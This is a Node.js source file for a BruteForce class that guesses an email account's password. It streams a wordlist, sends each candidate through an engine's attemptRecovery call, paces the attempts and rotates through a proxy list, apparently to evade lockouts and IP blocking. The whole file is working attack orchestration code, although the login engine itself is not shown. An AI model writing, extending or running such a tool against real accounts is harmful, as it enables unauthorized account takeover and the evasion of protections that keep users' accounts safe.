const fs = require('fs');
const readline = require('readline');
const { EventEmitter } = require('events');

/**
 * BruteForce class orchestrates password guessing using a wordlist.
 * It implements rate limiting and proxy rotation.
 */
class BruteForce extends EventEmitter {
    constructor(config) {
        super();
        this.config = config;
        this.currentProxyIndex = 0;
        this.attemptCount = 0;
        this.isRunning = false;
    }

    async execute(engine) {
        this.isRunning = true;
        const wordlistStream = fs.createReadStream(this.config.wordlistPath, { encoding: 'utf8' });
        const rl = readline.createInterface({
            input: wordlistStream,
            crlfDelay: Infinity
        });

        for await (const password of rl) {
            if (!this.isRunning) break;
            
            const trimmedPassword = password.trim();
            if (!trimmedPassword) continue;

            this.attemptCount++;
            this.emit('attempt', { attempt: this.attemptCount, password: trimmedPassword });

            const result = await engine.attemptRecovery(this.config.targetEmail, trimmedPassword);
            
            if (result.success) {
                this.isRunning = false;
                return { success: true, password: trimmedPassword, attempts: this.attemptCount };
            }

            // Rate limiting delay
            await this._delay(this.config.delayBetweenAttempts);
            
            // Rotate proxy if configured
            if (this.config.proxyList.length > 0) {
                this._rotateProxy();
            }
        }

        return { success: false, attempts: this.attemptCount };
    }

    _rotateProxy() {
        this.currentProxyIndex = (this.currentProxyIndex + 1) % this.config.proxyList.length;
        const proxy = this.config.proxyList[this.currentProxyIndex];
        this.emit('proxy_rotated', { proxy });
    }

    _delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    stop() {
        this.isRunning = false;
    }
}

module.exports = { BruteForce };
